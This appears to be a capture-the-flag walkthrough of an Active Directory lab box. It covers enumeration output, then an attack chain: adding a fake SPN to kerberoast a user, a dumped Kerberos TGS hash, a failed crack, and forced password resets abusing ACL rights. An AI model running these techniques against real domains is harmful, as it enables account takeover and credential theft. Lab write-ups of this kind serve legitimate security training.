nmap output:
```bash
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-08 06:19:05Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
```

enum4linux as olivia output:
```bash
 ==========================================
|    Listener Scan on administrator.htb    |
 ==========================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =========================================================
|    Domain Information via LDAP for administrator.htb    |
 =========================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: administrator.htb

 ==============================================
|    SMB Dialect Check on administrator.htb    |
 ==============================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ================================================================
|    Domain Information via SMB session for administrator.htb    |
 ================================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC
NetBIOS domain name: ADMINISTRATOR
DNS domain: administrator.htb
FQDN: dc.administrator.htb
Derived membership: domain member
Derived domain: ADMINISTRATOR

 ========================================================
|    Domain Information via RPC for administrator.htb    |
 ========================================================
[+] Domain: ADMINISTRATOR
[+] Domain SID: S-1-5-21-1088858960-373806567-254189436
[+] Membership: domain member

 ====================================================
|    OS Information via RPC for administrator.htb    |
 ====================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: ''
OS build: '20348'
Native OS: not supported
Native LAN manager: not supported
Platform id: '500'
Server type: '0x80102b'
Server type string: Sv PDC Tim NT

 ==========================================
|    Users via RPC on administrator.htb    |
 ==========================================
[*] Enumerating users via 'querydispinfo'
[+] Found 10 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 10 user(s) via 'enumdomusers'
[+] After merging user results we have 10 user(s) total:
'1108':
  username: olivia
  name: Olivia Johnson
  acb: '0x00000214'
  description: (null)
'1109':
  username: michael
  name: Michael Williams
  acb: '0x00000210'
  description: (null)
'1110':
  username: benjamin
  name: Benjamin Brown
  acb: '0x00000210'
  description: (null)
'1112':
  username: emily
  name: Emily Rodriguez
  acb: '0x00000210'
  description: (null)
'1113':
  username: ethan
  name: Ethan Hunt
  acb: '0x00000210'
  description: (null)
'3601':
  username: alexander
  name: Alexander Smith
  acb: '0x00000211'
  description: (null)
'3602':
  username: emma
  name: Emma Johnson
  acb: '0x00000211'
  description: (null)
'500':
  username: Administrator
  name: (null)
  acb: '0x00000210'
  description: Built-in account for administering the computer/domain
'501':
  username: Guest
  name: (null)
  acb: '0x00000215'
  description: Built-in account for guest access to the computer/domain
'502':
  username: krbtgt
  name: (null)
  acb: '0x00020011'
  description: Key Distribution Center Service Account

 ===========================================
|    Groups via RPC on administrator.htb    |
 ===========================================
[*] Enumerating local groups
[+] Found 6 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 28 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 15 group(s) via 'enumdomgroups'
[+] After merging groups results we have 49 group(s) total:
'1101':
  groupname: DnsAdmins
  type: local
'1102':
  groupname: DnsUpdateProxy
  type: domain
'1111':
  groupname: Share Moderators
  type: local
'498':
  groupname: Enterprise Read-only Domain Controllers
  type: domain
'512':
  groupname: Domain Admins
  type: domain
'513':
  groupname: Domain Users
  type: domain
'514':
  groupname: Domain Guests
  type: domain
'515':
  groupname: Domain Computers
  type: domain
'516':
  groupname: Domain Controllers
  type: domain
'517':
  groupname: Cert Publishers
  type: local
'518':
  groupname: Schema Admins
  type: domain
'519':
  groupname: Enterprise Admins
  type: domain
'520':
  groupname: Group Policy Creator Owners
  type: domain
'521':
  groupname: Read-only Domain Controllers
  type: domain
'522':
  groupname: Cloneable Domain Controllers
  type: domain
'525':
  groupname: Protected Users
  type: domain
'526':
  groupname: Key Admins
  type: domain
'527':
  groupname: Enterprise Key Admins
  type: domain
'544':
  groupname: Administrators
  type: builtin
'545':
  groupname: Users
  type: builtin
'546':
  groupname: Guests
  type: builtin
'548':
  groupname: Account Operators
  type: builtin
'549':
  groupname: Server Operators
  type: builtin
'550':
  groupname: Print Operators
  type: builtin
'551':
  groupname: Backup Operators
  type: builtin
'552':
  groupname: Replicator
  type: builtin
'553':
  groupname: RAS and IAS Servers
  type: local
'554':
  groupname: Pre-Windows 2000 Compatible Access
  type: builtin
'555':
  groupname: Remote Desktop Users
  type: builtin
'556':
  groupname: Network Configuration Operators
  type: builtin
'557':
  groupname: Incoming Forest Trust Builders
  type: builtin
'558':
  groupname: Performance Monitor Users
  type: builtin
'559':
  groupname: Performance Log Users
  type: builtin
'560':
  groupname: Windows Authorization Access Group
  type: builtin
'561':
  groupname: Terminal Server License Servers
  type: builtin
'562':
  groupname: Distributed COM Users
  type: builtin
'568':
  groupname: IIS_IUSRS
  type: builtin
'569':
  groupname: Cryptographic Operators
  type: builtin
'571':
  groupname: Allowed RODC Password Replication Group
  type: local
'572':
  groupname: Denied RODC Password Replication Group
  type: local
'573':
  groupname: Event Log Readers
  type: builtin
'574':
  groupname: Certificate Service DCOM Access
  type: builtin
'575':
  groupname: RDS Remote Access Servers
  type: builtin
'576':
  groupname: RDS Endpoint Servers
  type: builtin
'577':
  groupname: RDS Management Servers
  type: builtin
'578':
  groupname: Hyper-V Administrators
  type: builtin
'579':
  groupname: Access Control Assistance Operators
  type: builtin
'580':
  groupname: Remote Management Users
  type: builtin
'582':
  groupname: Storage Replica Administrators
  type: builtin

 ===========================================
|    Shares via RPC on administrator.htb    |
 ===========================================
[*] Enumerating shares
[+] Found 5 share(s):
ADMIN$:
  comment: Remote Admin
  type: Disk
C$:
  comment: Default share
  type: Disk
IPC$:
  comment: Remote IPC
  type: IPC
NETLOGON:
  comment: Logon server share
  type: Disk
SYSVOL:
  comment: Logon server share
  type: Disk
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share NETLOGON
[-] Could not parse result of smbclient command, please open a GitHub issue
[*] Testing share SYSVOL
[-] Could not parse result of smbclient command, please open a GitHub issue

 ==============================================
|    Policies via RPC for administrator.htb    |
 ==============================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:
  Password history length: 24
  Minimum password length: 7
  Maximum password age: 41 days 23 hours 53 minutes
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 30 minutes
  Lockout duration: 30 minutes
  Lockout threshold: None
Domain logoff information:
  Force logoff time: not set
```

evil-winrm as olivia output:
```bash
*Evil-WinRM* PS C:\Users\olivia> ls

    Directory: C:\Users\olivia

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---          5/8/2021   1:20 AM                Desktop
d-r---         12/7/2024  10:46 PM                Documents
d-r---          5/8/2021   1:20 AM                Downloads
d-r---          5/8/2021   1:20 AM                Favorites
d-r---          5/8/2021   1:20 AM                Links
d-r---          5/8/2021   1:20 AM                Music
d-r---          5/8/2021   1:20 AM                Pictures
d-----          5/8/2021   1:20 AM                Saved Games
d-r---          5/8/2021   1:20 AM                Videos

*Evil-WinRM* PS C:\Users\olivia> cd ..
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/22/2024  11:46 AM                Administrator
d-----        10/30/2024   2:25 PM                emily
d-----         12/7/2024  11:00 PM                olivia
d-r---         10/4/2024  10:08 AM                Public
```

winpeas output:
```bash
[*] BASIC SYSTEM INFO
 [+] WINDOWS OS
   [i] Check for vulnerabilities for the OS version with the applied patches
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
winPEAS.bat : Access is denied.
    + CategoryInfo          : NotSpecified: (Access is denied.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

ERROR:Description = Access denied
Access is denied.
 [+] DATE and TIME
   [i] You may need to adjust your local date/time to exploit some vulnerability
Sat 12/07/2024
11:11 PM

 [+] Audit Settings
   [i] Check what is being logged


 [+] WEF Settings
   [i] Check where are being sent the logs

 [+] Legacy Microsoft LAPS installed?
   [i] Check what is being logged

 [+] Windows LAPS installed?
   [i] Check what is being logged: 0x00 Disabled, 0x01 Backup to Entra, 0x02 Backup to Active Directory

 [+] LSA protection?
   [i] Active if "1"


 [+] Credential Guard?
   [i] Active if "1" or "2"



 [+] WDigest?
   [i] Plain-text creds in memory if "1"

 [+] Number of cached creds
   [i] You need System-rights to extract them

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    CACHEDLOGONSCOUNT    REG_SZ    10

 [+] UAC Settings
   [i] If the results read ENABLELUA REG_DWORD 0x1, part or all of the UAC components are on
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1


 [+] Registered Anti-Virus(AV)
ERROR:Description = Invalid namespace
Checking for defender whitelisted PATHS
 [+] PowerShell settings
PowerShell v2 Version:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine
    PowerShellVersion    REG_SZ    2.0

PowerShell v5 Version:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine
    PowerShellVersion    REG_SZ    5.1.20348.1

Transcriptions Settings:
Module logging settings:
Scriptblog logging settings:

PS default transcript history

Checking PS history file

 [+] MOUNTED DISKS
   [i] Maybe you find something interesting


 [+] ENVIRONMENT
   [i] Interesting information?

ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\olivia\AppData\Roaming
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=DC
ComSpec=C:\Windows\system32\cmd.exe
CurrentFolder=C:\Users\olivia\
CurrentLine= 0x1B[33m[+]0x1B[97m ENVIRONMENT
DriverData=C:\Windows\System32\Drivers\DriverData
E=0x1B[
expl=no
LOCALAPPDATA=C:\Users\olivia\AppData\Local
long=false
NUMBER_OF_PROCESSORS=2
OS=Windows_NT
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\php-8.2.24;C:\Users\olivia\AppData\Local\Microsoft\WindowsApps
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
Percentage=1
PercentageTrack=20
PROCESSOR_ARCHITECTURE=AMD64
PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
PROCESSOR_LEVEL=25
PROCESSOR_REVISION=0101
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=C:\Users\olivia\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC=C:\Users\Public
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Users\olivia\AppData\Local\Temp
TMP=C:\Users\olivia\AppData\Local\Temp
USERDNSDOMAIN=administrator.htb
USERDOMAIN=ADMINISTRATOR
USERNAME=olivia
USERPROFILE=C:\Users\olivia
windir=C:\Windows

 [+] INSTALLED SOFTWARE
   [i] Some weird software? Check for vulnerabilities in unknow software installed
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software

Common Files
Common Files
Internet Explorer
Internet Explorer
Microsoft
Microsoft.NET
ModifiableWindowsApps
VMware
Windows Defender
Windows Defender
Windows Defender Advanced Threat Protection
Windows Mail
Windows Mail
Windows Media Player
Windows Media Player
Windows NT
Windows NT
Windows Photo Viewer
Windows Photo Viewer
WindowsPowerShell
WindowsPowerShell
    InstallLocation    REG_SZ    C:\Program Files\VMware\VMware Tools\
    InstallLocation    REG_SZ    C:\Program Files (x86)\Microsoft\Edge\Application

 [+] Remote Desktop Credentials Manager
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager

 [+] WSUS
   [i] You can inject 'fake' updates into non-SSL WSUS traffic (WSUXploit)
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus

 [+] RUNNING PROCESSES
   [i] Something unexpected is running? Check for vulnerabilities
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes
ERROR: Access denied
   [i] Checking file permissions of running processes (File backdooring - maybe the same files start automatically when Administrator logs in)
ERROR:Description = Access denied
   [i] Checking directory permissions of running processes (DLL injection)
ERROR:Description = Access denied
 [+] RUN AT STARTUP
   [i] Check if you can modify any binary that is going to be executed by admin or if you can impersonate a not found binary
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#run-at-startup
C:\Documents and Settings\All Users\Start Menu\Programs\Startup\desktop.ini BUILTIN\Administrators:(F)

C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini BUILTIN\Administrators:(F)

Access is denied.
```

bloodhound generic all on user michael from user olivia:
![image](https://github.com/user-attachments/assets/9fa0fa4a-94ee-4ba1-8475-c58014d74e73)

set SPN for user michael since we have generic all:
```bash
*Evil-WinRM* PS C:\Users\olivia> Get-ADUser michael


DistinguishedName : CN=Michael Williams,CN=Users,DC=administrator,DC=htb
Enabled           : True
GivenName         : Michael
Name              : Michael Williams
ObjectClass       : user
ObjectGUID        : 4bf6d1d4-02dc-434c-8dd7-cf73b81063a1
SamAccountName    : michael
SID               : S-1-5-21-1088858960-373806567-254189436-1109
Surname           : Williams
UserPrincipalName : michael@administrator.htb



*Evil-WinRM* PS C:\> Set-ADObject -Identity "CN=Michael Williams,CN=Users,DC=administrator,DC=htb" -Add @{servicePrincipalName="fake/service"}
*Evil-WinRM* PS C:\> Get-ADUser michael -Properties ServicePrincipalName


DistinguishedName    : CN=Michael Williams,CN=Users,DC=administrator,DC=htb
Enabled              : True
GivenName            : Michael
Name                 : Michael Williams
ObjectClass          : user
ObjectGUID           : 4bf6d1d4-02dc-434c-8dd7-cf73b81063a1
SamAccountName       : michael
ServicePrincipalName : {fake/service}
SID                  : S-1-5-21-1088858960-373806567-254189436-1109
Surname              : Williams
UserPrincipalName    : michael@administrator.htb
```

kerberoast user michael since he now has SPN:
```bash
└──╼ [★]$ impacket-GetUserSPNs administrator.htb/olivia:ichliebedich -request -dc-ip 10.129.96.179
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name     MemberOf                                                       PasswordLastSet             LastLogon  Delegation 
--------------------  -------  -------------------------------------------------------------  --------------------------  ---------  ----------
fake/service          michael  CN=Remote Management Users,CN=Builtin,DC=administrator,DC=htb  2024-10-05 20:33:37.049043  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrator.htb/michael*$add1e69039bd27cd6eebd8f8530f3fae$3f2cab225a667da44ffa6aaa743b4b4e01cab77a4760914cac83cba8101799da25426d497c57779dbb23f7eff3c862ed139f54bddf8195b27e663380043cd18246bd256c115734b53939ad00fc104631b306c84fac6c9e0241804b469b7c11afe7d4013765b39a67b4b877406a7b154014ade2a5dadb2b6500ea225e9d0a52e3507deb02dd63fa11568e252d0a397b7c8853d2f7a9ba7ee6f377d91616108a64ab221fd0adc89612bf6b6a387cbf2d22d0b30740fcbdbcdb3d8afbf120e8fed6d76cfc21ba19d0e62a155a25512393cd68941e297bc64d3251b3e4b109c6dfd2e981c72b5723cb5412fa278e8aef179f045dd88154e275923aaf908c941ec9a3dd68fc9fbac6a82a865a1ef798c9b6e99fcba4b10d0339e2d9d44ef2926fbbfa43e6bc8ff3b3b0024ecff5a35065326e85390e2faa06e7e7c916cf15bed0e34a3ec5173a07b7b2bdbc210cfea31ff33d3405553df8e9e3520aa2d2a5e94cf629ecdd5bd542b6e0637145b76845557770755b7c832b39d61462059adde75f0d1e4293d68b2fa230c63dec2846af77463022eed95ef3ecb1aeadea2171312a5b57aacd237f03f752fe0471ea00a6107d57def0fdfdf2115166c17fbf04bb1ef00bfb738b053c373cd02a935528ac58106373c6aaacba2e1c6d3921e6911684c959c3999afb12f05c46a212ced74d1a92a10a0460b6835e9ebdb3ca00319925ee6f5ce75924cdde951ea23078c906603df2543a25763918e855d2913a8bab0b52c4a873b1325239174e8c4dc243ed9f6ae8c6f91d9a1888acc45d5cf2d9fd3112c6d54ffad089bc3426f46d286d5a73c1fa8882e6a1f0b21476dd0102078836ec4f32cb1303d972bbd139327ee96f43199b82b99bc1942773922eaa78f4b9c9c5d63774f5b55b1961ddefc320427323b3c6cb6e502278d1e7f3bfd04700e46fde675b0f72accd29cbb56463875986eea28b1c3015fa3d0368d162cb04e1ed6682cf426f20cd3802a2dabe92ba26402292ed1306cce1a2ce531bd1abf43524dec7263a2dce343ea24ac7bb622000f79ee7e717e4a7bbecde66b16cbb57d8939aec2c2c63c24efc3d65f302ac7358a7fee321adcc5b0ab96e03dd35b8a1b01d0b798ad173ed89c25ea6e636f2c7c149960efc43044b26d042883f780165f146acb69fe46e3e39f1b5861a68de935f1d45e840122cdc9fa2cdcb7500cf7c5250f3a895534e3411bcaaa66e2cd34a637aac285f12579df760be9ed894f122e4159be3e830ff602a9a6f8e851e036d427e62aaee65ebd562f48c0ec24b5d820a700fa8e568e6479b035d2d565e86b04f92e09813daab0945dd6e5b843a3f01629a8aca117019e498eb3aa9138d1d4fc558b3cff8a3c4226324f2c8ad9076cc27537e671b4e800368c7e5fabbb05f9f7bf9a5e3a916b64204d9fc46898d64fdcae5b8b66e517f2bd998af0cd335b2a76c42627fee3ab5b22e99ddedb6bef108b318d6defa3a6c7f38ebf2d99bc7d157490b9756630b96181a0330cdd1
```

hashcat output for user michael (no result):
```bash     
Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrato...30cdd1
Time.Started.....: Sat Dec  7 22:30:01 2024 (3 secs)
Time.Estimated...: Sat Dec  7 22:30:04 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (./rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4285.8 kH/s (1.66ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 0/14344384 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[2321676f7468] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Temp: 48c Util: 52%
```

since no result, try changing michael password directly:
```bash
*Evil-WinRM* PS C:\Users\olivia> $newpass = ConvertTo-SecureString "YourNewPassword123!" -AsPlainText -Force
*Evil-WinRM* PS C:\Users\olivia> Set-ADAccountPassword -Identity michael -NewPassword $newpass -Server administrator.htb -Verbose
Verbose: Performing the operation "Set-ADAccountPassword" on target "CN=Michael Williams,CN=Users,DC=administrator,DC=htb".
```

bloodhound force change password on user benjamin from user michael:
![image](https://github.com/user-attachments/assets/fa41c00a-6e35-4b20-9136-db97005f2465)

connect as michael since we changed password and force change password for user benjamin:
```bash
*Evil-WinRM* PS C:\Users\michael\Documents> $newpass = ConvertTo-SecureString "YourNewPassword123!" -AsPlainText -Force
*Evil-WinRM* PS C:\Users\michael\Documents> Set-ADAccountPassword -Identity benjamin -Reset -NewPassword $NewPass -Verbose
Verbose: Performing the operation "Set-ADAccountPassword" on target "CN=Benjamin Brown,CN=Users,DC=administrator,DC=htb".
```
